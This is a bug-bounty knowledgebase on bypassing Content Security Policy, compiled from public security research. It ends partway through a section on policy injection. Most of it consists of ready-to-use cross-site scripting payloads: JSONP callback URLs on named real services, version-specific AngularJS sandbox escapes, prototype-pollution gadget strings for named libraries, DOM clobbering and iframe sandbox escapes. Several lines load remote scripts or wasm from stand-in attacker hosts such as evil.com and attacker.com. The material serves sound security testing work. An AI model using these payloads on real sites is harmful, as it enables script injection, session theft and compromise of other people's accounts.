# CSP Bypass Knowledgebase

> **Research-grade knowledgebase for advanced bug bounty hunting and black-box testing.**
> Compiled from PortSwigger Research, HackTricks, PayloadsAllTheThings, MDN, CSP Evaluator, and community research.

---

## Table of Contents

- [Basics](#basics)
- [CSP Theory](#csp-theory)
- [CSP Directives Overview](#csp-directives-overview)
- [script-src Bypasses](#script-src-bypasses)
- [object-src Bypasses](#object-src-bypasses)
- [base-uri Abuse](#base-uri-abuse)
- [Trusted CDN Abuse](#trusted-cdn-abuse)
- [JSONP Chains](#jsonp-chains)
- [Nonce Bypasses](#nonce-bypasses)
- [strict-dynamic Bypasses](#strict-dynamic-bypasses)
- [AngularJS CSP Bypasses](#angularjs-csp-bypasses)
- [DOM Clobbering Chains](#dom-clobbering-chains)
- [Prototype Pollution + CSP Chains](#prototype-pollution--csp-chains)
- [postMessage + CSP Chains](#postmessage--csp-chains)
- [Sandbox Escape Chains](#sandbox-escape-chains)
- [Trusted Domain Abuse](#trusted-domain-abuse)
- [data: URI Payloads](#data-uri-payloads)
- [blob: URI Payloads](#blob-uri-payloads)
- [wasm CSP Bypasses](#wasm-csp-bypasses)
- [Browser Quirks](#browser-quirks)
- [Gadget Chains](#gadget-chains)
- [Policy Injection Techniques](#policy-injection-techniques)
- [Real World Case Studies](#real-world-case-studies)
- [Fuzzing Payloads](#fuzzing-payloads)
- [Automation Workflows](#automation-workflows)
- [Recon Methodology](#recon-methodology)
- [Nuclei Templates](#nuclei-templates)
- [Tools and Scanners](#tools-and-scanners)
- [Advanced Research](#advanced-research)
- [Bug Bounty Writeups](#bug-bounty-writeups)
- [Payload Collections](#payload-collections)
- [WAF Bypasses](#waf-bypasses)
- [Detection Techniques](#detection-techniques)
- [References](#references)

---

## Basics

Content Security Policy (CSP) is a browser security mechanism designed to mitigate Cross-Site Scripting (XSS) and data injection attacks. It works by restricting the resources a page can load and whether a page can be framed by other pages.

CSP is delivered via the `Content-Security-Policy` HTTP response header or via `<meta>` tags (with limitations).

### Key Concepts

- **Directives**: Control specific resource types (`script-src`, `style-src`, `img-src`, etc.)
- **Source Expressions**: Define allowed origins (`'self'`, `'none'`, URLs, schemes, nonces, hashes)
- **Fallback**: `default-src` acts as fallback for unspecified fetch directives
- **Enforcement vs Report-Only**: `Content-Security-Policy` enforces; `Content-Security-Policy-Report-Only` only reports violations

### Common Misconceptions

1. CSP is **not** a replacement for input sanitization — it is defense in depth
2. Allowlist-based CSPs are often bypassable due to CDN abuse, JSONP endpoints, and open redirects on trusted domains
3. Nonce-based CSPs are stronger but vulnerable to **script gadgets** and **DOM clobbering**
4. `unsafe-inline` effectively neutralizes most CSP protections
5. `unsafe-eval` allows `eval()`, `Function()`, and string-based `setTimeout`/`setInterval`

---

## CSP Theory

### How CSP Works

When a browser loads a document with CSP:
1. Parses the policy into directives
2. For each resource load, checks if the source matches the relevant directive
3. Blocks violations and optionally reports them
4. Inline scripts require nonces, hashes, or `'unsafe-inline'`
5. `eval()` and similar require `'unsafe-eval'`

### Strict CSP vs Allowlist CSP

**Allowlist CSP** (legacy, insecure):
```http
Content-Security-Policy: script-src 'self' https://ajax.googleapis.com https://cdn.example.com
```
- Hard to maintain
- Often whitelists domains with exploitable endpoints (JSONP, open redirects, upload features)

**Strict CSP** (recommended by Google/MDN):
```http
Content-Security-Policy: script-src 'nonce-RANDOM'; object-src 'none'; base-uri 'none'
```
- Uses nonces or hashes
- Much stronger against XSS
- Requires dynamic content generation for nonces

### strict-dynamic

The `'strict-dynamic'` keyword allows scripts trusted by nonce/hash to load child scripts without requiring their own nonces/hashes. This simplifies third-party script integration but creates trust propagation risks.

```http
Content-Security-Policy: script-src 'nonce-abc123' 'strict-dynamic'
```

If a nonce-trusted script creates `<script>` elements dynamically based on attacker-controlled input, the CSP will not block them.

---

## CSP Directives Overview

### Fetch Directives

| Directive | Controls |
|-----------|----------|
| `default-src` | Fallback for all fetch directives |
| `script-src` | JavaScript sources |
| `script-src-elem` | `<script>` element sources (overrides `script-src` in Chrome) |
| `script-src-attr` | Inline event handler sources |
| `style-src` | CSS sources |
| `img-src` | Image sources |
| `connect-src` | XHR, WebSocket, EventSource |
| `font-src` | Font sources |
| `object-src` | `<object>`, `<embed>`, `<applet>` |
| `media-src` | `<audio>`, `<video>` |
| `frame-src` | `<iframe>`, `<frame>` |
| `worker-src` | Workers, SharedWorkers |
| `manifest-src` | Web App Manifest |

### Document Directives

| Directive | Controls |
|-----------|----------|
| `base-uri` | `<base>` element URLs |
| `sandbox` | Applies sandbox flags to document |
| `require-trusted-types-for` | Enforces Trusted Types API |
| `trusted-types` | Allowed Trusted Types policy names |

### Navigation Directives

| Directive | Controls |
|-----------|----------|
| `form-action` | Form submission targets |
| `frame-ancestors` | Who can embed this page (clickjacking protection) |

### Reporting Directives

| Directive | Purpose |
|-----------|---------|
| `report-uri` | Deprecated URL for violation reports |
| `report-to` | Reporting API endpoint name |

### Source Expression Keywords

| Keyword | Meaning |
|---------|---------|
| `'self'` | Same origin (scheme + host + port) |
| `'none'` | Block everything |
| `'unsafe-inline'` | Allow inline scripts/styles |
| `'unsafe-eval'` | Allow `eval()`, `Function()`, etc. |
| `'unsafe-hashes'` | Allow inline event handlers by hash |
| `'strict-dynamic'` | Trust propagation for nonce/hash scripts |
| `'report-sample'` | Include sample in violation report |

---

## script-src Bypasses

### 1. Unsafe Inline

If `'unsafe-inline'` is present, standard XSS payloads work:

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
```

### 2. Self + Markup Injection

If `script-src 'self'` is set and the site has an HTML injection vulnerability:

```html
<script src="/path/controlled/by/attacker?data="></script>
```

If the site reflects attacker input inside a script tag or allows file uploads to same origin.

### 3. Missing default-src

If only `script-src` is set but `object-src`, `base-uri`, or other directives are missing:

```html
<object data="https://evil.com/swf.swf"></object>
<base href="https://evil.com/">
```

### 4. Unsafe Eval + Angular/Vue/React

If `'unsafe-eval'` is present alongside AngularJS or frameworks using `eval`:

```html
{{constructor.constructor('alert(1)')()}}
```

### 5. Self + Iframe + JS Execution

If `script-src 'self'` and iframes are allowed:

```html
<iframe srcdoc="<script>alert(1)</script>"></iframe>
```

Note: `srcdoc` inherits the parent's CSP in modern browsers, but sandboxed iframes may not.

### 6. Script Gadgets on Self

If the site uses libraries that execute scripts from DOM attributes:

```html
<div data-toggle="tooltip" title="<script>alert(1)</script>"></div>
```

### 7. script-src-elem Override (Chrome)

Chrome supports `script-src-elem` which overrides `script-src`. If you can inject policy directives:

```
script-src 'self'; script-src-elem 'unsafe-inline'
```

This allows inline scripts while keeping `script-src` restrictive on paper.

### 8. Missing script-src-attr

If `script-src` is strict but `script-src-attr` is missing or loose:

```html
<button onclick="alert(1)">Click</button>
```

### 9. Blob and Data URI in script-src

If `script-src` allows `blob:` or `data:`:

```javascript
// Blob bypass
var blob = new Blob(['alert(1)'], {type: 'text/javascript'});
var url = URL.createObjectURL(blob);
var s = document.createElement('script');
s.src = url;
document.body.appendChild(s);
```

```html
<!-- data: URI -->
<script src="data:text/javascript,alert(1)"></script>
```

### 10. Missing Worker Directives

If `worker-src` is missing, falls back to `script-src` or `default-src`. If those are loose:

```javascript
var w = new Worker('data:text/javascript,postMessage("xss")');
```

---

## object-src Bypasses

If `object-src` is missing or set to `'self'`:

```html
<object data="https://evil.com/malicious.swf" type="application/x-shockwave-flash"></object>
<embed src="https://evil.com/malicious.swf" type="application/x-shockwave-flash"></embed>
```

If `object-src 'none'` is NOT set, Flash/Silverlight/Java applets can execute code.

**Modern bypass**: PDF injection via `<embed>` if PDF viewer allows JavaScript:

```html
<embed src="https://evil.com/xss.pdf" width="100%" height="100%"></embed>
```

---

## base-uri Abuse

If `base-uri` is missing or set to `'self'` but an injection point exists:

```html
<base href="https://attacker.com/">
```

This changes the base URL for all relative scripts, forms, and links. If a page loads:

```html
<script src="/js/app.js"></script>
```

After base injection, it loads from `https://attacker.com/js/app.js`.

**Exploitation chain**:
1. Inject `<base href="https://attacker.com/">`
2. Wait for relative script load
3. Serve malicious script from your server at the expected path

**Note**: `base-uri 'none'` prevents this entirely.

---

## Trusted CDN Abuse

CDNs that do not use per-customer URLs are dangerous in allowlist CSPs.

### Dangerous Domains in Allowlists

```http
script-src 'self' https://ajax.googleapis.com https://cdnjs.cloudflare.com
```

**Google APIs**:
```html
<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.0/angular.js"></script>
```

If AngularJS is allowed, CSTI/XSS follows.

**JSONP on Google**:
```html
<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)"></script>
```

**Cloudflare CDNJS**:
If a library with known gadgets is whitelisted (jQuery, Angular, etc.), gadgets can be abused.

**GitHub Raw / jsDelivr**:
```http
script-src 'self' https://cdn.jsdelivr.net
```

Attacker can host malicious files on npm and load via jsDelivr.

### Google Script Hosting Abuse

Google allows script hosting on some endpoints that may be whitelisted:
```
https://script.google.com/macros/s/.../exec
```

If `*.google.com` or `*.googleapis.com` is whitelisted, these can serve attacker-controlled scripts.

---

## JSONP Chains

JSONP endpoints execute attacker-controlled callback functions, making them perfect for CSP bypass when the domain is whitelisted.

### Finding JSONP Endpoints

Look for parameters like `callback`, `cb`, `jsonp`, `_callback`, `jsoncallback`.

### Common JSONP Endpoints

```html
<!-- Google Translate -->
<script src="https://translate.googleapis.com/translate_a/l?client=te&cb=alert(1)"></script>

<!-- Google Maps -->
<script src="https://maps.googleapis.com/maps/api/js?callback=alert(1)"></script>

<!-- Twitter -->
<script src="https://platform.twitter.com/jsonp?callback=alert(1)"></script>

<!-- Facebook -->
<script src="https://graph.facebook.com/?id=1&callback=alert(1)"></script>

<!-- Reddit -->
<script src="https://www.reddit.com/r/all/.json?jsonp=alert(1)"></script>

<!-- Flickr -->
<script src="https://api.flickr.com/services/feeds/photos_public.gne?format=json&jsoncallback=alert(1)"></script>

<!-- Vimeo -->
<script src="https://vimeo.com/api/v2/video/1.json?callback=alert(1)"></script>

<!-- Dailymotion -->
<script src="https://api.dailymotion.com/video/x26m1j4?callback=alert(1)"></script>

<!-- GitHub Gist -->
<script src="https://gist.github.com/user/gistid.json?callback=alert(1)"></script>

<!-- Shopify -->
<script src="https://store.myshopify.com/admin/products.json?callback=alert(1)"></script>

<!-- WordPress REST API -->
<script src="https://target.com/wp-json/wp/v2/users?_jsonp=alert(1)"></script>

<!-- Yahoo -->
<script src="https://query.yahooapis.com/v1/public/yql?q=select%20*%20from%20weather&format=json&callback=alert(1)"></script>

<!-- PayPal -->
<script src="https://www.paypal.com/xoplatform/logger/api/logger?callback=alert(1)"></script>

<!-- Mail.ru -->
<script src="https://appsmail.ru/platform/api?method=users.getInfo&app_id=1&callback=alert(1)"></script>

<!-- VK -->
<script src="https://api.vk.com/method/users.get?callback=alert(1)"></script>

<!-- Yandex -->
<script src="https://api-maps.yandex.ru/2.1/?lang=en_US&onload=alert(1)"></script>

<!-- Baidu -->
<script src="https://sp0.baidu.com/5a1Fazu8AA54nxGko9WTAnF6hhy/su?wd=test&cb=alert(1)"></script>

<!-- Sina Weibo -->
<script src="https://vip.stock.finance.sina.com.cn/quotes_service/api/jsonp.php/CN_MarketData.getKLineData?symbol=sh600000&callback=alert(1)"></script>

<!-- Douban -->
<script src="https://api.douban.com/v2/movie/in_theaters?callback=alert(1)"></script>

<!-- Tencent QQ -->
<script src="https://qzs.qq.com/qzone/v6/portal/proxy.html?callback=alert(1)"></script>

<!-- Instagram -->
<script src="https://api.instagram.com/v1/users/self/?access_token=TOKEN&callback=alert(1)"></script>

<!-- Pinterest -->
<script src="https://widgets.pinterest.com/v3/pidgets/user/?username=test&callback=alert(1)"></script>

<!-- LinkedIn -->
<script src="https://www.linkedin.com/countserv/count/share?url=test&callback=alert(1)"></script>

<!-- Tumblr -->
<script src="https://api.tumblr.com/v2/blog/test.tumblr.com/posts?api_key=KEY&callback=alert(1)"></script>

<!-- SoundCloud -->
<script src="https://api.soundcloud.com/tracks/1.json?client_id=ID&callback=alert(1)"></script>

<!-- Twitch -->
<script src="https://api.twitch.tv/kraken/channels/test?callback=alert(1)"></script>

<!-- Slack -->
<script src="https://slack.com/api/api.test?callback=alert(1)&error=alert(1)"></script>
```

### JSONP + AngularJS Chain

If AngularJS is loaded from trusted CDN, combine with CSTI:

```html
<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.0/angular.min.js"></script>
<div ng-app ng-csp>{{$on.constructor('alert(1)')()}}</div>
```

---

## Nonce Bypasses

### Theory

Nonce-based CSP requires matching `nonce` attributes on scripts with the CSP header value. The nonce must be:
- Cryptographically random
- Unique per response
- Unpredictable by attackers

### Bypass Technique 1: Script Gadgets (Recaptcha Case Study)

From PortSwigger research on portswigger.net:

The site had nonce-based CSP but contained this vulnerable code:

```javascript
var t = document.querySelector("[id^='RecaptchaClientUrl-']").value
  , i = document.querySelector("[id^='RecaptchaClientSecret-']").value
  , n = document.createElement("script");
n.id = "RecaptchaScript";
n.src = t + i;
```

**Attack**: DOM clobber the input element before the legitimate one:

```html
<input id="RecaptchaClientUrl-" value="//attacker.com/xss.js" />
```

`querySelector` returns the first match — the attacker's injected element. The script gets the attacker URL and loads it with the nonce already on the page.

**Key Insight**: Nonce-based CSP is bypassable if JavaScript reads from attacker-controllable DOM properties to determine script sources.

### Bypass Technique 2: nonce Reuse on Static Pages

If the server caches pages with nonces or uses static nonces:

```html
<script nonce="static123">alert(1)</script>
```

Attacker learns the nonce and injects it.

### Bypass Technique 3: nonce Reflection in URL Parameters

If the nonce is reflected in the URL and can be controlled:

```
?nonce= attacker-controlled
```

### Bypass Technique 4: Brute Force (Short Nonces)

If nonces are short or poorly randomized:

```javascript
// Brute force nonce via iframe
for(let i=0; i<10000; i++) {
  let n = i.toString().padStart(4, '0');
  let s = document.createElement('script');
  s.nonce = n;
  s.innerHTML = 'alert(1)';
  document.body.appendChild(s);
}
```

### Bypass Technique 5: CSP Meta Tag + nonce

If the page uses `<meta>` CSP but the nonce is predictable or static:

```html
<meta http-equiv="Content-Security-Policy" content="script-src 'nonce-abc123'">
```

---

## strict-dynamic Bypasses

### Theory

`'strict-dynamic'` allows nonce-trusted scripts to load child scripts without nonces. If a trusted script dynamically creates `<script>` elements based on attacker input, CSP allows them.

### Bypass Chain

1. Site has `script-src 'nonce-abc' 'strict-dynamic'`
2. Trusted script (e.g., jQuery loader) does:

```javascript
$.getScript(location.hash.slice(1)); // loads from attacker URL
```

3. Attacker provides hash: `#https://evil.com/xss.js`
4. Script loads and executes despite no nonce

### Angular + strict-dynamic

If Angular is trusted by nonce and uses `strict-dynamic`:

```html
<script nonce="abc" src="angular.js"></script>
<div ng-app>{{constructor.constructor('alert(1)')()}}</div>
```

Angular's template expressions execute arbitrary JS, and any scripts Angular loads are trusted by propagation.

---

## AngularJS CSP Bypasses

### Client-Side Template Injection (CSTI)

AngularJS evaluates expressions inside `{{}}`. Even if input is HTML-encoded, Angular expressions execute.

```html
<p>{{constructor.constructor('alert(1)')()}}</p>
```

### Sandbox Escapes by Version

**Angular 1.0.1 - 1.1.5**:
```html
{{constructor.constructor('alert(1)')()}}
```

**Angular 1.2.0 - 1.2.1**:
```html
{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}
```

**Angular 1.2.2 - 1.2.5**:
```html
{{'a'[{toString:[].join,length:1,0:'__proto__'}].charAt=''.valueOf;$eval("x='"+(y='if(!window\u002ex)alert(window\u002ex=1)')+eval(y)+"'");}}
```

**Angular 1.2.6 - 1.2.18**:
```html
{{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'alert(1)')()}}
```

**Angular 1.2.19 - 1.2.23**:
```html
{{toString.constructor.prototype.toString=toString.constructor.prototype.call;["a","alert(1)"].sort(toString.constructor);}}
```

**Angular 1.2.24 - 1.2.29**:
```html
{{'a'.constructor.prototype.charAt=''.valueOf;$eval("x='"+(y='if(!window\u002ex)alert(window\u002ex=1)')+eval(y)+"'");}}
```

**Angular 1.3.0**:
```html
{{!ready && (ready = true) && (
  !call
  ? $$watchers[0].get(toString.constructor.prototype)
  : (a = apply) &&
    (apply = constructor) &&
    (valueOf = call) &&
    (''+''.toString(
      'F = Function.prototype;' +
      'F.apply = F.a;' +
      'delete F.a;' +
      'delete F.valueOf;' +
      'alert(1);'
    ))
);}}
```

**Angular 1.3.1 - 1.3.2**:
```html
{{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;
'a'.constructor.prototype.charAt=''.valueOf;
$eval('x=alert(1)//');}}
```

**Angular 1.3.3 - 1.3.18**:
```html
{{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;
'a'.constructor.prototype.charAt=[].join;
$eval('x=alert(1)//');}}
```

**Angular 1.3.19**:
```html
{{'a'[{toString:false,valueOf:[].join,length:1,0:'__proto__'}].charAt=[].join;
$eval('x=alert(1)//');}}
```

**Angular 1.3.20**:
```html
{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}
```

**Angular 1.4.0 - 1.4.9**:
```html
{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}
```

**Angular 1.5.0 - 1.5.8**:
```html
{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}}
```

**Angular 1.5.9 - 1.5.11**:
```html
{{
    c=''.sub.call;b=''.sub.bind;a=''.sub.apply;
    c.$apply=$apply;c.$eval=b;op=$root.$$phase;
    $root.$$phase=null;od=$root.$digest;$root.$digest=({}).toString;
    C=c.$apply(c);$root.$$phase=op;$root.$digest=od;
    B=C(b,c,b);$evalAsync("
    astNode=pop();astNode.type='UnaryExpression';
    astNode.operator='(window.X?void0:(window.X=true,alert(1)))+';
    astNode.argument={type:'Identifier',name:'foo'};
    ");
    m1=B($$asyncQueue.pop().expression,null,$root);
    m2=B(C,null,m1);[].push.apply=m2;a=''.sub;
    $eval('a(b.c)');[].push.apply=a;
}}
```

**Angular >= 1.6.0 (sandbox removed)**:
```html
{{constructor.constructor('alert(1)')()}}
```

### Angular CSP Bypass Notes

- Angular 1.6+ removed the sandbox entirely
- Even with CSP, if AngularJS is loaded from a trusted source, CSTI bypasses nonce-based CSP because the Angular framework itself is trusted
- Use `ng-csp` directive to disable certain Angular features, but this does not prevent all bypasses

---

## DOM Clobbering Chains

### Basics

DOM Clobbering turns HTML injections into JavaScript variable control by abusing how named DOM elements become global properties.

```html
<a id=x><a id=x name=y href="Clobbered">
<script>
alert(x.y) // "Clobbered"
</script>
```

### Two-Level Clobbering

```html
<form id=x><output id=y>I've been clobbered</output>
<script>
alert(x.y.value);
</script>
```

### Three-Level Clobbering

```html
<form id=x name=y><input id=z></form>
<form id=x></form>
<script>
alert(x.y.z)
</script>
```

### Multi-Level via Iframes (Terjanq Technique)

```html
<iframe name=a srcdoc="
<iframe srcdoc='<a id=c name=d href=cid:Clobbered>test</a><a id=c>' name=b>"></iframe>
<style>@import '//portswigger.net';</style>
<script>
alert(a.b.c.d)
</script>
```

The `@import` creates a delay allowing the iframe to render before script execution.

### Clobbering Collections

```html
<a id=x><a id=x name=y href="Clobbered">
<script>
alert(x.y) // Clobbered
</script>
```

### Clobbering with Form Elements

```html
<form id=x>
<input id=y name=z>
<input id=y>
</form>
<script>
x.y.forEach(element=>alert(element))
</script>
```

Chrome labels these as `[object RadioNodeList]` with array methods.

### URL Property Clobbering

Anchor tags expose `username` and `password` from URL:

```html
<a id=x href="ftp:Clobbered-username:Clobbered-Password@a">
<script>
alert(x.username) // Clobbered-username
alert(x.password) // Clobbered-Password
</script>
```

### Protocol Abuse for Unencoded Values

```html
<a id=x href="abc:<>">
<script>
alert(x) // abc:<>
</script>
```

Firefox with base tag:
```html
<base href=a:abc><a id=x href="Firefox<>">
<script>
alert(x) // Firefox<>
</script>
```

Chrome base technique:
```html
<base href="a://Clobbered<>"><a id=x name=x><a id=x name=xyz href=123>
<script>
alert(x.xyz) // a://Clobbered<>
</script>
```

### DOM Clobbering + CSP Bypass Chain

If nonce-based CSP exists but JavaScript uses `querySelector` with prefix selectors:

```html
<!-- Attacker injects before legitimate element -->
<input id="RecaptchaClientUrl-" value="//attacker.com/xss.js" />
```

JavaScript does:
```javascript
var t = document.querySelector("[id^='RecaptchaClientUrl-']").value;
var n = document.createElement("script");
n.src = t;
```

The attacker's input is loaded as a script. Since the script is created by trusted JavaScript, it inherits the nonce or executes under `strict-dynamic`.

---

## Prototype Pollution + CSP Chains

### Theory

Prototype Pollution allows modifying `Object.prototype`, affecting all objects. When combined with CSP gadgets, it can bypass sanitizers or change script loading behavior.

### jQuery Gadgets

```
?__proto__[innerHTML]=<img/src/onerror%3dalert(1)>
```

```
?__proto__[context]=<img/src/onerror%3dalert(1)>&__proto__[jquery]=x
```

```
?__proto__[url][]=data:,alert(1)//&__proto__[dataType]=script
```

```
?__proto__[src][]=data:,alert(1)//
```

### Google reCAPTCHA

```
?__proto__[srcdoc][]=<script>alert(1)</script>
```

### Google Tag Manager

```
?__proto__[vtp_enableRecaptcha]=1&__proto__[srcdoc]=<script>alert(1)</script>
```

```
?__proto__[q][0][0]=require&__proto__[q][0][1]=x&__proto__[q][0][2]=https://attacker.com/xss.js
```

### DOMPurify Bypass

```
?__proto__[ALLOWED_ATTR][0]=onerror&__proto__[ALLOWED_ATTR][1]=src
```

```
?__proto__[documentMode]=9
```

### Vue.js Gadgets

```
?__proto__[v-if]=_c.constructor('alert(1)')()
```

```
?__proto__[template]=<script>alert(1)</script>
```

```
?__proto__[v-bind:class]=''.constructor.constructor('alert(1)')()
```

### Lodash

```
?__proto__[sourceURL]=  alert(1)
```

### Google Closure

```
?__proto__[CLOSURE_BASE_PATH]=data:,alert(1)//
```

```
?__proto__[trustedTypes]=x&__proto__[emptyHTML]=<img/src/onerror%3dalert(1)>
```

### Marionette.js / Backbone.js

```
?__proto__[tagName]=img&__proto__[src][]=x:&__proto__[onerror][]=alert(1)
```

### Akamai Boomerang

```
?__proto__[BOOMR]=1&__proto__[url]=//attacker.tld/js.js
```

### Segment Analytics.js

```
?__proto__[script][0]=1&__proto__[script][1]=<img/src/onerror%3dalert(1)>
```

### Knockout.js

```
?__proto__[4]=a':1,[alert(1)]:1,'b&__proto__[5]=,
```

### Zepto.js

```
?__proto__[onerror]=alert(1)
```

```
?__proto__[html]=<img/src/onerror%3dalert(1)>
```

### Popper.js

```
?__proto__[arrow][style]=color:red;transition:all%201s&__proto__[arrow][ontransitionend]=alert(1)
```

### Pendo Agent

```
?__proto__[dataHost]=attacker.tld/js.js%23
```

### hCaptcha

```
?__proto__[assethost]=javascript:alert(1)//
```

### Chain with CSP

If CSP allows `data:` or the polluted property causes a script load from an allowed domain:

1. Pollute `__proto__` to change a library's script source URL
2. Library loads attacker script from `data:` or trusted domain
3. Script executes under CSP because it was loaded by trusted code

---

## postMessage + CSP Chains

### Theory

If a page uses `postMessage` to communicate with iframes and the message handler performs unsafe operations, CSP may not protect against it if the operation is allowed by the policy.

### Common Vulnerable Patterns

```javascript
window.addEventListener('message', function(e) {
  if(e.origin === 'https://trusted.com') {
    eval(e.data); // unsafe-eval required
  }
});
```

If `'unsafe-eval'` is in CSP, this is exploitable.

### postMessage + DOM Injection

```javascript
window.addEventListener('message', function(e) {
  document.body.innerHTML += e.data; // If CSP allows inline or the HTML contains allowed scripts
});
```

### postMessage + Script Loading

```javascript
window.addEventListener('message', function(e) {
  var s = document.createElement('script');
  s.src = e.data;
  document.body.appendChild(s);
});
```

If `e.data` is attacker-controlled and `script-src` allows the domain, bypass achieved.

### postMessage + Angular/Vue Template Injection

```javascript
window.addEventListener('message', function(e) {
  $scope.template = e.data; // Angular template injection
});
```

---

## Sandbox Escape Chains

### iframe sandbox

If CSP uses `sandbox` directive without `allow-scripts`:

```html
<iframe sandbox="allow-scripts" src="data:text/html,<script>alert(1)</script>"></iframe>
```

If `allow-scripts` is present but `allow-same-origin` is not, the iframe runs in unique origin.

### Escaping via `allow-popups`

```html
<iframe sandbox="allow-scripts allow-popups" src="data:text/html,
<script>
window.open('javascript:alert(1)');
</script>
"></iframe>
```

### Escaping via `allow-top-navigation`

```html
<iframe sandbox="allow-scripts allow-top-navigation" src="data:text/html,
<script>
top.location = 'javascript:alert(1)';
</script>
"></iframe>
```

### Escaping via form submission

If `allow-forms` is present:
```html
<form action="javascript:alert(1)"><button>Click</button></form>
```

### CSP sandbox + base-uri

If `sandbox` is set but `base-uri` is missing:
```html
<base href="https://attacker.com/">
```

Changes relative URLs inside sandboxed content.

---

## Trusted Domain Abuse

### Open Redirects on Whitelisted Domains

If `https://trusted.com` is whitelisted and has an open redirect:

```html
<script src="https://trusted.com/redirect?url=https://evil.com/xss.js"></script>
```

### Upload Features on Whitelisted Domains

If users can upload JS/SWF/HTML to a whitelisted domain:

```html
<script src="https://trusted.com/user-uploads/xss.js"></script>
```

### Path-relative Script Loading + Path Traversal

If the site loads scripts relatively and has path traversal:

```html
<script src="/static/../../../evil.js"></script>
```

### Subdomain Takeover

If `*.trusted.com` is whitelisted and a subdomain is unclaimed:
1. Take over subdomain
2. Host malicious scripts
3. Load via whitelisted domain

---

## data: URI Payloads

If `data:` is in `script-src`, `object-src`, or `frame-src`:

### script-src data:

```html
<script src="data:text/javascript,alert(1)"></script>
<script src="data:text/javascript;base64,YWxlcnQoMSk="></script>
```

### img-src data: for exfiltration

```html
<img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7">
```

### frame-src data:

```html
<iframe src="data:text/html,<script>alert(1)</script>"></iframe>
```

### object-src data:

```html
<object data="data:text/html,<script>alert(1)</script>"></object>
```

### Base64 Variants

```html
<script src="data:text/javascript;base64,YWxlcnQoMSk7"></script>
```

---

## blob: URI Payloads

If `blob:` is allowed in relevant directives:

### JavaScript Blob

```javascript
var blob = new Blob(['alert(1)'], {type: 'text/javascript'});
var url = URL.createObjectURL(blob);
var s = document.createElement('script');
s.src = url;
document.body.appendChild(s);
```

### HTML Blob in iframe

```javascript
var blob = new Blob(['<script>alert(1)</script>'], {type: 'text/html'});
var url = URL.createObjectURL(blob);
var f = document.createElement('iframe');
f.src = url;
document.body.appendChild(f);
```

### Worker Blob

```javascript
var blob = new Blob(['postMessage("xss")'], {type: 'text/javascript'});
var w = new Worker(URL.createObjectURL(blob));
```

---

## wasm CSP Bypasses

WebAssembly can execute code even with restrictive CSP if `unsafe-eval` is present (required for `WebAssembly.instantiate`).

### wasm + eval bypass

If `'unsafe-eval'` is in CSP:

```javascript
fetch('https://evil.com/payload.wasm')
  .then(r => r.arrayBuffer())
  .then(b => WebAssembly.instantiate(b))
  .then(r => r.instance.exports.e());
```

### wasm as gadget

If the site compiles user-provided wasm:

```javascript
// Attacker provides malicious wasm that calls imported JS functions
const importObject = {
  env: {
    alert: function() { alert(1); }
  }
};
```

---

## Browser Quirks

### Edge Policy Dropping

Microsoft Edge (legacy) drops the **entire** CSP if it encounters invalid syntax:

```
Content-Security-Policy: ...; report-uri /api/log?token=VALUE;_
```

If `token` is attacker-controlled, injecting `;_` causes Edge to drop the policy entirely.

### Chrome script-src-elem Override

Chrome allows `script-src-elem` to override `script-src`. If you can inject directives at the end of a policy:

```
...; script-src-elem 'unsafe-inline'
```

This enables inline scripts in Chrome even if `script-src` is strict.

### Safari data: URI Handling

Safari has historically been more permissive with `data:` URIs in certain contexts.

### Firefox base href Protocol

Firefox allows arbitrary protocols in `<base href>` which affects anchor parsing:

```html
<base href=a:abc><a id=x href="Firefox<>">
```

### Chrome Dangling Markup Mitigation

Chrome blocks requests containing raw newlines or angle brackets in certain contexts, preventing some dangling markup attacks.

### IE/Edge Legacy MIME Sniffing

Legacy Edge and IE may execute scripts from unexpected MIME types if the content looks like script.

---

## Gadget Chains

### jQuery Gadgets

```javascript
// $(html) parses HTML and executes scripts in some versions
$('<img src=x onerror=alert(1)>')

// $.getScript loads external scripts
$.getScript('https://evil.com/xss.js')

// $(location.hash) - hashChange XSS
$(location.hash)
```

### Google reCAPTCHA Gadget

```javascript
// reCAPTCHA loader reads from DOM input
var t = document.querySelector("[id^='RecaptchaClientUrl-']").value;
var n = document.createElement("script");
n.src = t;
```

### Wistia Embedded Video

```
?__proto__[innerHTML]=<img/src/onerror%3dalert(1)>
```

### Twitter Universal Website Tag (Fixed)

```
?__proto__[hif][]=javascript:alert(1)
```

### Tealium Universal Tag

```
?__proto__[attrs][src]=1&__proto__[src]=data:,alert(1)//
```

### Adobe Dynamic Tag Management

```
?__proto__[src]=data:,alert(1)//
```

### Swiftype Site Search

```
?__proto__[xxx]=alert(1)
```

### Embedly Cards

```
?__proto__[onload]=alert(1)
```

### Demandbase Tag

```
?__proto__[Config][SiteOptimization][enabled]=1&__proto__[Config][SiteOptimization][recommendationApiURL]=//attacker.tld/json_cors.php?
```

### Google Analytics

```
?__proto__[q][0][0]=require&__proto__[q][0][1]=x&__proto__[q][0][2]=https://attacker.com/xss.js
```

### script.aculo.us

```
?x=x&x[constructor][__parseStyleElement][innerHTML]=<img/src/onerror%3dalert(1)>
```

---

## Policy Injection Techniques

### report-uri Injection

If a parameter is reflected into `report-uri`:

```http
Content-Security-Policy: ...; report-uri /api/log?token=SOMETOKEN
```

Attacker changes token:
```
token=SOMETOKEN;script-src-elem 'unsafe-inline';_
```

Chrome skips invalid directives but `script-src-elem` overrides `script-src`.

### Edge Invalid Syntax Dropping

In legacy Edge, invalid syntax drops the entire policy:
```
token=SOMETOKEN;_
```

### Parameter Pollution

If multiple CSP headers are combined or parameters are concatenated:

```
?csp=script-src 'self'&csp=script-src 'unsafe-inline'
```

### Header Injection via CRLF

If user input reaches headers without sanitization:

```
